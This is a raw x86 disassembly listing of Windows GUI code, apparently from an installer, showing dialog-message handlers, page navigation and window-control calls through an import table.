  403a58:	89 3d 68 eb 42 00    	mov    %edi,0x42eb68
  403a5e:	ff d6                	call   *%esi
  403a60:	6a 02                	push   $0x2
  403a62:	57                   	push   %edi
  403a63:	a3 d8 9f 42 00       	mov    %eax,0x429fd8
  403a68:	ff d6                	call   *%esi
  403a6a:	6a ff                	push   $0xffffffff
  403a6c:	6a 1c                	push   $0x1c
  403a6e:	57                   	push   %edi
  403a6f:	a3 a0 8f 42 00       	mov    %eax,0x428fa0
  403a74:	e8 45 03 00 00       	call   0x403dbe
  403a79:	ff 35 48 e3 42 00    	push   0x42e348
  403a7f:	6a f2                	push   $0xfffffff2
  403a81:	57                   	push   %edi
  403a82:	ff 15 80 71 40 00    	call   *0x407180
  403a88:	6a 04                	push   $0x4
  403a8a:	e8 7c d9 ff ff       	call   0x40140b
  403a8f:	a3 2c e3 42 00       	mov    %eax,0x42e32c
  403a94:	33 c0                	xor    %eax,%eax
  403a96:	40                   	inc    %eax
  403a97:	a3 c4 9f 42 00       	mov    %eax,0x429fc4
  403a9c:	8b 0d a4 91 40 00    	mov    0x4091a4,%ecx
  403aa2:	33 ed                	xor    %ebp,%ebp
  403aa4:	8b f1                	mov    %ecx,%esi
  403aa6:	c1 e6 06             	shl    $0x6,%esi
  403aa9:	03 35 80 eb 42 00    	add    0x42eb80,%esi
  403aaf:	3b cd                	cmp    %ebp,%ecx
  403ab1:	7c 3e                	jl     0x403af1
  403ab3:	83 f8 01             	cmp    $0x1,%eax
  403ab6:	75 31                	jne    0x403ae9
  403ab8:	55                   	push   %ebp
  403ab9:	ff 76 10             	push   0x10(%esi)
  403abc:	e8 c8 d8 ff ff       	call   0x401389
  403ac1:	85 c0                	test   %eax,%eax
  403ac3:	74 24                	je     0x403ae9
  403ac5:	6a 01                	push   $0x1
  403ac7:	55                   	push   %ebp
  403ac8:	68 0f 04 00 00       	push   $0x40f
  403acd:	ff 35 38 e3 42 00    	push   0x42e338
  403ad3:	ff 15 44 72 40 00    	call   *0x407244
  403ad9:	33 c0                	xor    %eax,%eax
  403adb:	39 2d 2c e3 42 00    	cmp    %ebp,0x42e32c
  403ae1:	0f 94 c0             	sete   %al
  403ae4:	e9 a4 02 00 00       	jmp    0x403d8d
  403ae9:	39 2e                	cmp    %ebp,(%esi)
  403aeb:	0f 84 9a 02 00 00    	je     0x403d8b
  403af1:	68 0b 04 00 00       	push   $0x40b
  403af6:	e8 0f 03 00 00       	call   0x403e0a
  403afb:	a1 c4 9f 42 00       	mov    0x429fc4,%eax
  403b00:	01 05 a4 91 40 00    	add    %eax,0x4091a4
  403b06:	c1 e0 06             	shl    $0x6,%eax
  403b09:	03 f0                	add    %eax,%esi
  403b0b:	a1 a4 91 40 00       	mov    0x4091a4,%eax
  403b10:	3b 05 84 eb 42 00    	cmp    0x42eb84,%eax
  403b16:	75 07                	jne    0x403b1f
  403b18:	6a 01                	push   $0x1
  403b1a:	e8 ec d8 ff ff       	call   0x40140b
  403b1f:	39 2d 2c e3 42 00    	cmp    %ebp,0x42e32c
  403b25:	0f 85 1e 02 00 00    	jne    0x403d49
  403b2b:	a1 84 eb 42 00       	mov    0x42eb84,%eax
  403b30:	39 05 a4 91 40 00    	cmp    %eax,0x4091a4
  403b36:	0f 83 0d 02 00 00    	jae    0x403d49
  403b3c:	ff 76 24             	push   0x24(%esi)
  403b3f:	8b 5e 14             	mov    0x14(%esi),%ebx
  403b42:	68 00 68 43 00       	push   $0x436800
  403b47:	e8 e2 1e 00 00       	call   0x405a2e
  403b4c:	ff 76 20             	push   0x20(%esi)
  403b4f:	68 19 fc ff ff       	push   $0xfffffc19
  403b54:	57                   	push   %edi
  403b55:	e8 64 02 00 00       	call   0x403dbe
  403b5a:	ff 76 1c             	push   0x1c(%esi)
  403b5d:	68 1b fc ff ff       	push   $0xfffffc1b
  403b62:	57                   	push   %edi
  403b63:	e8 56 02 00 00       	call   0x403dbe
  403b68:	ff 76 28             	push   0x28(%esi)
  403b6b:	68 1a fc ff ff       	push   $0xfffffc1a
  403b70:	57                   	push   %edi
  403b71:	e8 48 02 00 00       	call   0x403dbe
  403b76:	6a 03                	push   $0x3
  403b78:	57                   	push   %edi
  403b79:	ff 15 2c 72 40 00    	call   *0x40722c
  403b7f:	39 2d ec eb 42 00    	cmp    %ebp,0x42ebec
  403b85:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403b89:	74 08                	je     0x403b93
  403b8b:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403b90:	83 cb 04             	or     $0x4,%ebx
  403b93:	8b cb                	mov    %ebx,%ecx
  403b95:	83 e1 08             	and    $0x8,%ecx
  403b98:	51                   	push   %ecx
  403b99:	50                   	push   %eax
  403b9a:	ff 15 60 72 40 00    	call   *0x407260
  403ba0:	8b c3                	mov    %ebx,%eax
  403ba2:	25 00 01 00 00       	and    $0x100,%eax
  403ba7:	50                   	push   %eax
  403ba8:	ff 74 24 30          	push   0x30(%esp)
  403bac:	ff 15 3c 72 40 00    	call   *0x40723c
  403bb2:	8b c3                	mov    %ebx,%eax
  403bb4:	83 e0 02             	and    $0x2,%eax
  403bb7:	50                   	push   %eax
  403bb8:	e8 23 02 00 00       	call   0x403de0
  403bbd:	83 e3 04             	and    $0x4,%ebx
  403bc0:	53                   	push   %ebx
  403bc1:	ff 35 a0 8f 42 00    	push   0x428fa0
  403bc7:	ff 15 3c 72 40 00    	call   *0x40723c
  403bcd:	3b dd                	cmp    %ebp,%ebx
  403bcf:	74 03                	je     0x403bd4
  403bd1:	55                   	push   %ebp
  403bd2:	eb 02                	jmp    0x403bd6
  403bd4:	6a 01                	push   $0x1
  403bd6:	68 60 f0 00 00       	push   $0xf060
  403bdb:	55                   	push   %ebp
  403bdc:	57                   	push   %edi
  403bdd:	ff 15 7c 71 40 00    	call   *0x40717c
  403be3:	50                   	push   %eax
  403be4:	ff 15 78 71 40 00    	call   *0x407178
  403bea:	8b 1d 44 72 40 00    	mov    0x407244,%ebx
  403bf0:	6a 01                	push   $0x1
  403bf2:	55                   	push   %ebp
  403bf3:	68 f4 00 00 00       	push   $0xf4
  403bf8:	ff 74 24 38          	push   0x38(%esp)
  403bfc:	ff d3                	call   *%ebx
  403bfe:	39 2d ec eb 42 00    	cmp    %ebp,0x42ebec
  403c04:	74 13                	je     0x403c19
  403c06:	55                   	push   %ebp
  403c07:	6a 02                	push   $0x2
  403c09:	68 01 04 00 00       	push   $0x401
  403c0e:	57                   	push   %edi
  403c0f:	ff d3                	call   *%ebx
  403c11:	ff 35 a0 8f 42 00    	push   0x428fa0
  403c17:	eb 06                	jmp    0x403c1f
  403c19:	ff 35 d8 9f 42 00    	push   0x429fd8
  403c1f:	e8 cf 01 00 00       	call   0x403df3
  403c24:	bb e0 9f 42 00       	mov    $0x429fe0,%ebx
  403c29:	68 60 e3 42 00       	push   $0x42e360
  403c2e:	53                   	push   %ebx
  403c2f:	e8 d8 1d 00 00       	call   0x405a0c
  403c34:	ff 76 18             	push   0x18(%esi)
  403c37:	53                   	push   %ebx
  403c38:	e8 e5 1d 00 00       	call   0x405a22
  403c3d:	03 c3                	add    %ebx,%eax
  403c3f:	50                   	push   %eax
  403c40:	e8 e9 1d 00 00       	call   0x405a2e
  403c45:	53                   	push   %ebx
  403c46:	57                   	push   %edi
  403c47:	ff 15 f4 71 40 00    	call   *0x4071f4
  403c4d:	55                   	push   %ebp
  403c4e:	ff 76 08             	push   0x8(%esi)
  403c51:	e8 33 d7 ff ff       	call   0x401389
  403c56:	85 c0                	test   %eax,%eax
  403c58:	0f 85 9d fe ff ff    	jne    0x403afb
  403c5e:	39 2e                	cmp    %ebp,(%esi)
  403c60:	0f 84 95 fe ff ff    	je     0x403afb
  403c66:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  403c6a:	75 1d                	jne    0x403c89
  403c6c:	39 2d ec eb 42 00    	cmp    %ebp,0x42ebec
  403c72:	0f 85 13 01 00 00    	jne    0x403d8b
  403c78:	39 2d e0 eb 42 00    	cmp    %ebp,0x42ebe0
  403c7e:	0f 85 77 fe ff ff    	jne    0x403afb
  403c84:	e9 02 01 00 00       	jmp    0x403d8b
  403c89:	ff 35 38 e3 42 00    	push   0x42e338
  403c8f:	ff 15 e8 71 40 00    	call   *0x4071e8
  403c95:	89 35 b0 97 42 00    	mov    %esi,0x4297b0
  403c9b:	39 2e                	cmp    %ebp,(%esi)
  403c9d:	0f 8e c5 00 00 00    	jle    0x403d68
  403ca3:	8b 46 04             	mov    0x4(%esi),%eax
  403ca6:	56                   	push   %esi
  403ca7:	ff 34 85 a8 91 40 00 	push   0x4091a8(,%eax,4)
  403cae:	66 8b 06             	mov    (%esi),%ax
  403cb1:	66 03 05 40 e3 42 00 	add    0x42e340,%ax
  403cb8:	57                   	push   %edi
  403cb9:	0f b7 c0             	movzwl %ax,%eax
  403cbc:	50                   	push   %eax
  403cbd:	ff 35 60 eb 42 00    	push   0x42eb60
  403cc3:	ff 15 ec 71 40 00    	call   *0x4071ec
  403cc9:	3b c5                	cmp    %ebp,%eax
  403ccb:	a3 38 e3 42 00       	mov    %eax,0x42e338
  403cd0:	0f 84 92 00 00 00    	je     0x403d68
  403cd6:	ff 76 2c             	push   0x2c(%esi)
  403cd9:	6a 06                	push   $0x6
  403cdb:	50                   	push   %eax
  403cdc:	e8 dd 00 00 00       	call   0x403dbe
  403ce1:	8d 44 24 10          	lea    0x10(%esp),%eax
  403ce5:	50                   	push   %eax
  403ce6:	68 fa 03 00 00       	push   $0x3fa
  403ceb:	57                   	push   %edi
  403cec:	ff 15 2c 72 40 00    	call   *0x40722c
  403cf2:	50                   	push   %eax
  403cf3:	ff 15 74 71 40 00    	call   *0x407174
  403cf9:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cfd:	50                   	push   %eax
  403cfe:	57                   	push   %edi
  403cff:	ff 15 70 71 40 00    	call   *0x407170
  403d05:	6a 15                	push   $0x15
  403d07:	55                   	push   %ebp
  403d08:	55                   	push   %ebp
  403d09:	ff 74 24 20          	push   0x20(%esp)
  403d0d:	ff 74 24 20          	push   0x20(%esp)
  403d11:	55                   	push   %ebp
  403d12:	ff 35 38 e3 42 00    	push   0x42e338
  403d18:	ff 15 88 71 40 00    	call   *0x407188
  403d1e:	55                   	push   %ebp
  403d1f:	ff 76 0c             	push   0xc(%esi)
  403d22:	e8 62 d6 ff ff       	call   0x401389
  403d27:	39 2d 2c e3 42 00    	cmp    %ebp,0x42e32c
  403d2d:	75 5c                	jne    0x403d8b
  403d2f:	6a 08                	push   $0x8
  403d31:	ff 35 38 e3 42 00    	push   0x42e338
  403d37:	ff 15 60 72 40 00    	call   *0x407260
  403d3d:	68 05 04 00 00       	push   $0x405
  403d42:	e8 c3 00 00 00       	call   0x403e0a
  403d47:	eb 1f                	jmp    0x403d68
  403d49:	ff 35 38 e3 42 00    	push   0x42e338
  403d4f:	ff 15 e8 71 40 00    	call   *0x4071e8
  403d55:	ff 35 a8 93 42 00    	push   0x4293a8
  403d5b:	89 2d 68 eb 42 00    	mov    %ebp,0x42eb68
  403d61:	57                   	push   %edi
  403d62:	ff 15 6c 71 40 00    	call   *0x40716c
  403d68:	39 2d e0 af 42 00    	cmp    %ebp,0x42afe0
  403d6e:	75 1b                	jne    0x403d8b
  403d70:	39 2d 38 e3 42 00    	cmp    %ebp,0x42e338
  403d76:	74 13                	je     0x403d8b
  403d78:	6a 0a                	push   $0xa
  403d7a:	57                   	push   %edi
  403d7b:	ff 15 60 72 40 00    	call   *0x407260
  403d81:	c7 05 e0 af 42 00 01 	movl   $0x1,0x42afe0
  403d88:	00 00 00 
  403d8b:	33 c0                	xor    %eax,%eax
  403d8d:	5f                   	pop    %edi
  403d8e:	5e                   	pop    %esi
  403d8f:	5d                   	pop    %ebp
  403d90:	5b                   	pop    %ebx
  403d91:	83 c4 10             	add    $0x10,%esp
  403d94:	c2 10 00             	ret    $0x10
  403d97:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403d9c:	75 06                	jne    0x403da4
  403d9e:	ff 05 2c e3 42 00    	incl   0x42e32c
  403da4:	6a 00                	push   $0x0
  403da6:	ff 74 24 08          	push   0x8(%esp)
  403daa:	68 08 04 00 00       	push   $0x408
  403daf:	ff 35 68 eb 42 00    	push   0x42eb68
  403db5:	ff 15 44 72 40 00    	call   *0x407244
  403dbb:	c2 04 00             	ret    $0x4
  403dbe:	ff 74 24 0c          	push   0xc(%esp)
  403dc2:	6a 00                	push   $0x0
  403dc4:	e8 65 1c 00 00       	call   0x405a2e
  403dc9:	50                   	push   %eax
  403dca:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403dce:	05 e8 03 00 00       	add    $0x3e8,%eax
  403dd3:	50                   	push   %eax
  403dd4:	ff 74 24 0c          	push   0xc(%esp)
  403dd8:	e8 ce 14 00 00       	call   0x4052ab
  403ddd:	c2 0c 00             	ret    $0xc
  403de0:	ff 74 24 04          	push   0x4(%esp)
  403de4:	ff 35 d8 9f 42 00    	push   0x429fd8
  403dea:	ff 15 3c 72 40 00    	call   *0x40723c
  403df0:	c2 04 00             	ret    $0x4
  403df3:	6a 01                	push   $0x1
  403df5:	ff 74 24 08          	push   0x8(%esp)
  403df9:	6a 28                	push   $0x28
  403dfb:	ff 35 68 eb 42 00    	push   0x42eb68
  403e01:	ff 15 44 72 40 00    	call   *0x407244
  403e07:	c2 04 00             	ret    $0x4
  403e0a:	a1 38 e3 42 00       	mov    0x42e338,%eax
  403e0f:	85 c0                	test   %eax,%eax
  403e11:	74 0f                	je     0x403e22
  403e13:	6a 00                	push   $0x0
  403e15:	6a 00                	push   $0x0
  403e17:	ff 74 24 0c          	push   0xc(%esp)
  403e1b:	50                   	push   %eax
  403e1c:	ff 15 44 72 40 00    	call   *0x407244
  403e22:	c2 04 00             	ret    $0x4
  403e25:	55                   	push   %ebp
  403e26:	8b ec                	mov    %esp,%ebp
  403e28:	83 ec 0c             	sub    $0xc,%esp
  403e2b:	8b 45 08             	mov    0x8(%ebp),%eax
  403e2e:	56                   	push   %esi
  403e2f:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403e34:	83 f8 05             	cmp    $0x5,%eax
  403e37:	0f 87 8e 00 00 00    	ja     0x403ecb
  403e3d:	6a eb                	push   $0xffffffeb
  403e3f:	ff 75 10             	push   0x10(%ebp)
  403e42:	ff 15 90 71 40 00    	call   *0x407190
  403e48:	8b f0                	mov    %eax,%esi
  403e4a:	85 f6                	test   %esi,%esi
  403e4c:	74 7d                	je     0x403ecb
  403e4e:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403e52:	8b 06                	mov    (%esi),%eax
  403e54:	57                   	push   %edi
  403e55:	8b 3d 8c 71 40 00    	mov    0x40718c,%edi
  403e5b:	74 03                	je     0x403e60
  403e5d:	50                   	push   %eax
  403e5e:	ff d7                	call   *%edi
  403e60:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403e64:	74 0a                	je     0x403e70
  403e66:	50                   	push   %eax
  403e67:	ff 75 0c             	push   0xc(%ebp)
  403e6a:	ff 15 54 70 40 00    	call   *0x407054
  403e70:	ff 76 10             	push   0x10(%esi)
  403e73:	ff 75 0c             	push   0xc(%ebp)
  403e76:	ff 15 50 70 40 00    	call   *0x407050
  403e7c:	8b 46 04             	mov    0x4(%esi),%eax
  403e7f:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403e83:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e86:	74 06                	je     0x403e8e
  403e88:	50                   	push   %eax
  403e89:	ff d7                	call   *%edi
  403e8b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e8e:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403e92:	5f                   	pop    %edi
  403e93:	74 0a                	je     0x403e9f
  403e95:	50                   	push   %eax
  403e96:	ff 75 0c             	push   0xc(%ebp)
  403e99:	ff 15 3c 70 40 00    	call   *0x40703c
  403e9f:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403ea3:	74 21                	je     0x403ec6
  403ea5:	8b 46 08             	mov    0x8(%esi),%eax
  403ea8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403eab:	8b 46 0c             	mov    0xc(%esi),%eax
  403eae:	85 c0                	test   %eax,%eax
  403eb0:	74 07                	je     0x403eb9
  403eb2:	50                   	push   %eax
  403eb3:	ff 15 44 70 40 00    	call   *0x407044
  403eb9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403ebc:	50                   	push   %eax
  403ebd:	ff 15 48 70 40 00    	call   *0x407048
  403ec3:	89 46 0c             	mov    %eax,0xc(%esi)
  403ec6:	8b 46 0c             	mov    0xc(%esi),%eax
  403ec9:	eb 02                	jmp    0x403ecd
  403ecb:	33 c0                	xor    %eax,%eax
  403ecd:	5e                   	pop    %esi
  403ece:	c9                   	leave
  403ecf:	c2 0c 00             	ret    $0xc
  403ed2:	55                   	push   %ebp
  403ed3:	8b ec                	mov    %esp,%ebp
  403ed5:	8b 45 08             	mov    0x8(%ebp),%eax
  403ed8:	8b 0d a4 8f 42 00    	mov    0x428fa4,%ecx
  403ede:	ff 75 10             	push   0x10(%ebp)
  403ee1:	03 c8                	add    %eax,%ecx
  403ee3:	51                   	push   %ecx
  403ee4:	ff 75 0c             	push   0xc(%ebp)
  403ee7:	ff 15 b8 70 40 00    	call   *0x4070b8
  403eed:	ff 75 0c             	push   0xc(%ebp)
  403ef0:	e8 2d 1b 00 00       	call   0x405a22
  403ef5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403ef8:	89 01                	mov    %eax,(%ecx)
  403efa:	01 05 a4 8f 42 00    	add    %eax,0x428fa4
  403f00:	33 c0                	xor    %eax,%eax
  403f02:	5d                   	pop    %ebp
  403f03:	c2 10 00             	ret    $0x10
  403f06:	55                   	push   %ebp
  403f07:	8b ec                	mov    %esp,%ebp
  403f09:	83 ec 0c             	sub    $0xc,%esp
  403f0c:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403f13:	53                   	push   %ebx
  403f14:	56                   	push   %esi
  403f15:	57                   	push   %edi
  403f16:	0f 85 0d 01 00 00    	jne    0x404029
  403f1c:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403f1f:	8b 7b 30             	mov    0x30(%ebx),%edi
  403f22:	85 ff                	test   %edi,%edi
  403f24:	7d 11                	jge    0x403f37
  403f26:	8b 0d 3c e3 42 00    	mov    0x42e33c,%ecx
  403f2c:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403f33:	2b c8                	sub    %eax,%ecx
  403f35:	8b 39                	mov    (%ecx),%edi
  403f37:	a1 98 eb 42 00       	mov    0x42eb98,%eax
  403f3c:	ff 73 34             	push   0x34(%ebx)
  403f3f:	03 f8                	add    %eax,%edi
  403f41:	6a 22                	push   $0x22
  403f43:	0f be 07             	movsbl (%edi),%eax
  403f46:	89 45 14             	mov    %eax,0x14(%ebp)
  403f49:	8b 43 14             	mov    0x14(%ebx),%eax
  403f4c:	ff 75 08             	push   0x8(%ebp)
  403f4f:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403f53:	8b f0                	mov    %eax,%esi
  403f55:	47                   	inc    %edi
  403f56:	f7 d6                	not    %esi
  403f58:	c1 ee 05             	shr    $0x5,%esi
  403f5b:	83 e6 01             	and    $0x1,%esi
  403f5e:	83 e0 01             	and    $0x1,%eax
  403f61:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403f64:	c7 45 fc d2 3e 40 00 	movl   $0x403ed2,-0x4(%ebp)
  403f6b:	0b f0                	or     %eax,%esi
  403f6d:	e8 4c fe ff ff       	call   0x403dbe
  403f72:	ff 73 38             	push   0x38(%ebx)
  403f75:	6a 23                	push   $0x23
  403f77:	ff 75 08             	push   0x8(%ebp)
  403f7a:	e8 3f fe ff ff       	call   0x403dbe
  403f7f:	33 c0                	xor    %eax,%eax
  403f81:	6a 01                	push   $0x1
  403f83:	85 f6                	test   %esi,%esi
  403f85:	0f 94 c0             	sete   %al
  403f88:	05 0a 04 00 00       	add    $0x40a,%eax
  403f8d:	50                   	push   %eax
  403f8e:	ff 75 08             	push   0x8(%ebp)
  403f91:	ff 15 9c 71 40 00    	call   *0x40719c
  403f97:	56                   	push   %esi
  403f98:	e8 43 fe ff ff       	call   0x403de0
  403f9d:	68 e8 03 00 00       	push   $0x3e8
  403fa2:	ff 75 08             	push   0x8(%ebp)
  403fa5:	ff 15 2c 72 40 00    	call   *0x40722c
  403fab:	8b d8                	mov    %eax,%ebx
  403fad:	53                   	push   %ebx
  403fae:	e8 40 fe ff ff       	call   0x403df3
  403fb3:	8b 35 44 72 40 00    	mov    0x407244,%esi
  403fb9:	6a 00                	push   $0x0
  403fbb:	6a 01                	push   $0x1
  403fbd:	68 5b 04 00 00       	push   $0x45b
  403fc2:	53                   	push   %ebx
  403fc3:	ff d6                	call   *%esi
  403fc5:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  403fca:	8b 40 68             	mov    0x68(%eax),%eax
  403fcd:	85 c0                	test   %eax,%eax
  403fcf:	7d 09                	jge    0x403fda
  403fd1:	f7 d8                	neg    %eax
  403fd3:	50                   	push   %eax
  403fd4:	ff 15 8c 71 40 00    	call   *0x40718c
  403fda:	50                   	push   %eax
  403fdb:	6a 00                	push   $0x0
  403fdd:	68 43 04 00 00       	push   $0x443
  403fe2:	53                   	push   %ebx
  403fe3:	ff d6                	call   *%esi
  403fe5:	68 00 00 01 04       	push   $0x4010000
  403fea:	6a 00                	push   $0x0
  403fec:	68 45 04 00 00       	push   $0x445
  403ff1:	53                   	push   %ebx
  403ff2:	ff d6                	call   *%esi
  403ff4:	83 25 a4 8f 42 00 00 	andl   $0x0,0x428fa4
  403ffb:	57                   	push   %edi
  403ffc:	e8 21 1a 00 00       	call   0x405a22
  404001:	50                   	push   %eax
  404002:	6a 00                	push   $0x0
  404004:	68 35 04 00 00       	push   $0x435
  404009:	53                   	push   %ebx
  40400a:	ff d6                	call   *%esi
  40400c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40400f:	50                   	push   %eax
  404010:	ff 75 14             	push   0x14(%ebp)
  404013:	68 49 04 00 00       	push   $0x449
  404018:	53                   	push   %ebx
  404019:	ff d6                	call   *%esi
  40401b:	83 25 c0 9f 42 00 00 	andl   $0x0,0x429fc0
  404022:	33 c0                	xor    %eax,%eax
  404024:	e9 61 01 00 00       	jmp    0x40418a
  404029:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404030:	8b 1d 2c 72 40 00    	mov    0x40722c,%ebx
  404036:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40403c:	75 5a                	jne    0x404098
  40403e:	8b 45 10             	mov    0x10(%ebp),%eax
  404041:	c1 e8 10             	shr    $0x10,%eax
  404044:	66 85 c0             	test   %ax,%ax
  404047:	0f 85 2e 01 00 00    	jne    0x40417b
  40404d:	33 c0                	xor    %eax,%eax
  40404f:	39 05 c0 9f 42 00    	cmp    %eax,0x429fc0
  404055:	0f 85 20 01 00 00    	jne    0x40417b
  40405b:	8b 0d b0 97 42 00    	mov    0x4297b0,%ecx
  404061:	8d 79 14             	lea    0x14(%ecx),%edi
  404064:	f6 07 20             	testb  $0x20,(%edi)
  404067:	0f 84 0e 01 00 00    	je     0x40417b
  40406d:	50                   	push   %eax
  40406e:	50                   	push   %eax
  40406f:	68 f0 00 00 00       	push   $0xf0
  404074:	68 0a 04 00 00       	push   $0x40a
  404079:	ff 75 08             	push   0x8(%ebp)
  40407c:	ff d3                	call   *%ebx
  40407e:	50                   	push   %eax
  40407f:	ff d6                	call   *%esi
  404081:	8b 0f                	mov    (%edi),%ecx
  404083:	83 e0 01             	and    $0x1,%eax
  404086:	83 e1 fe             	and    $0xfffffffe,%ecx
  404089:	50                   	push   %eax
  40408a:	0b c8                	or     %eax,%ecx
  40408c:	89 0f                	mov    %ecx,(%edi)
  40408e:	e8 4d fd ff ff       	call   0x403de0
  404093:	e8 f9 00 00 00       	call   0x404191
  404098:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40409c:	0f 85 ca 00 00 00    	jne    0x40416c
  4040a2:	68 e8 03 00 00       	push   $0x3e8
  4040a7:	ff 75 08             	push   0x8(%ebp)
  4040aa:	ff d3                	call   *%ebx
  4040ac:	8b 7d 14             	mov    0x14(%ebp),%edi
  4040af:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4040b6:	75 72                	jne    0x40412a
  4040b8:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4040bf:	75 69                	jne    0x40412a
  4040c1:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4040c4:	8b 57 18             	mov    0x18(%edi),%edx
  4040c7:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4040ca:	2b ca                	sub    %edx,%ecx
  4040cc:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4040d2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4040d5:	c7 45 fc 00 db 42 00 	movl   $0x42db00,-0x4(%ebp)
  4040dc:	73 4c                	jae    0x40412a
  4040de:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4040e1:	51                   	push   %ecx
  4040e2:	6a 00                	push   $0x0
  4040e4:	68 4b 04 00 00       	push   $0x44b
  4040e9:	50                   	push   %eax
  4040ea:	ff d6                	call   *%esi
  4040ec:	8b 3d 98 71 40 00    	mov    0x407198,%edi
  4040f2:	68 02 7f 00 00       	push   $0x7f02
  4040f7:	6a 00                	push   $0x0
  4040f9:	ff d7                	call   *%edi
  4040fb:	8b 1d 94 71 40 00    	mov    0x407194,%ebx
  404101:	50                   	push   %eax
  404102:	ff d3                	call   *%ebx
  404104:	6a 01                	push   $0x1
  404106:	6a 00                	push   $0x0
  404108:	6a 00                	push   $0x0
  40410a:	ff 75 fc             	push   -0x4(%ebp)
  40410d:	68 c4 91 40 00       	push   $0x4091c4
  404112:	ff 75 08             	push   0x8(%ebp)
  404115:	ff 15 5c 71 40 00    	call   *0x40715c
  40411b:	68 00 7f 00 00       	push   $0x7f00
  404120:	6a 00                	push   $0x0
  404122:	ff d7                	call   *%edi
  404124:	50                   	push   %eax
  404125:	ff d3                	call   *%ebx
  404127:	8b 7d 14             	mov    0x14(%ebp),%edi
  40412a:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404131:	75 4b                	jne    0x40417e
  404133:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40413a:	75 42                	jne    0x40417e
  40413c:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404140:	75 11                	jne    0x404153
  404142:	6a 00                	push   $0x0
  404144:	6a 01                	push   $0x1
  404146:	68 11 01 00 00       	push   $0x111
  40414b:	ff 35 68 eb 42 00    	push   0x42eb68
  404151:	ff d6                	call   *%esi
  404153:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404157:	75 0e                	jne    0x404167
  404159:	6a 00                	push   $0x0
  40415b:	6a 00                	push   $0x0
  40415d:	6a 10                	push   $0x10
  40415f:	ff 35 68 eb 42 00    	push   0x42eb68
  404165:	ff d6                	call   *%esi
  404167:	33 c0                	xor    %eax,%eax
  404169:	40                   	inc    %eax
  40416a:	eb 1e                	jmp    0x40418a
  40416c:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404173:	75 06                	jne    0x40417b
  404175:	ff 05 c0 9f 42 00    	incl   0x429fc0
  40417b:	8b 7d 14             	mov    0x14(%ebp),%edi
  40417e:	57                   	push   %edi
  40417f:	ff 75 10             	push   0x10(%ebp)
  404182:	ff 75 0c             	push   0xc(%ebp)
  404185:	e8 9b fc ff ff       	call   0x403e25
  40418a:	5f                   	pop    %edi
  40418b:	5e                   	pop    %esi
  40418c:	5b                   	pop    %ebx
  40418d:	c9                   	leave
  40418e:	c2 10 00             	ret    $0x10
  404191:	83 3d ec eb 42 00 00 	cmpl   $0x0,0x42ebec
  404198:	a1 a0 8f 42 00       	mov    0x428fa0,%eax
  40419d:	75 05                	jne    0x4041a4
  40419f:	a1 d8 9f 42 00       	mov    0x429fd8,%eax
  4041a4:	6a 01                	push   $0x1
  4041a6:	6a 01                	push   $0x1
  4041a8:	68 f4 00 00 00       	push   $0xf4
  4041ad:	50                   	push   %eax
  4041ae:	ff 15 44 72 40 00    	call   *0x407244
  4041b4:	c3                   	ret
  4041b5:	55                   	push   %ebp
  4041b6:	8b ec                	mov    %esp,%ebp
  4041b8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4041bf:	56                   	push   %esi
  4041c0:	8b 75 14             	mov    0x14(%ebp),%esi
  4041c3:	75 26                	jne    0x4041eb
  4041c5:	ff 76 30             	push   0x30(%esi)
  4041c8:	6a 1d                	push   $0x1d
  4041ca:	ff 75 08             	push   0x8(%ebp)
  4041cd:	e8 ec fb ff ff       	call   0x403dbe
  4041d2:	8b 46 3c             	mov    0x3c(%esi),%eax
  4041d5:	c1 e0 0a             	shl    $0xa,%eax
  4041d8:	05 00 f0 42 00       	add    $0x42f000,%eax
  4041dd:	50                   	push   %eax
  4041de:	68 e8 03 00 00       	push   $0x3e8
  4041e3:	ff 75 08             	push   0x8(%ebp)
  4041e6:	e8 c0 10 00 00       	call   0x4052ab
  4041eb:	56                   	push   %esi
  4041ec:	ff 75 10             	push   0x10(%ebp)
  4041ef:	ff 75 0c             	push   0xc(%ebp)
  4041f2:	e8 2e fc ff ff       	call   0x403e25
  4041f7:	5e                   	pop    %esi
  4041f8:	5d                   	pop    %ebp
  4041f9:	c2 10 00             	ret    $0x10
  4041fc:	55                   	push   %ebp
  4041fd:	8b ec                	mov    %esp,%ebp
